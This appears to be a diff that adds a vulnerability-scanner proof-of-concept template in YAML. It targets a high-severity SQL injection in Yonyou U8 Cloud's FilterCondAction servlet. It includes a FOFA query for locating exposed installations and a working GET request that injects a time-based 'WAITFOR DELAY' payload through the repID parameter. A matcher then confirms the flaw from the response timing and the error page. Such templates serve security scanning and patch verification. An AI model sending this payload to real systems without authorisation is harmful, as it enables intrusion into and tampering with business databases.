@@ -1,0 +1,17 @@
+id: poc-yaml-yongyou-u8-cloud-filtercondaction-sqli
+info:
+  name: 用友U8Cloud FilterCondAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.bi.report.rep.FilterCondAction&method=execute&repID=1');WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: "status_code == 200 && \ncontains(title,\"错误提示 - iUFO\") &&\ncontains(body,\"\
+    【操作失败】\") &&\ncontains(headers,\".server\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
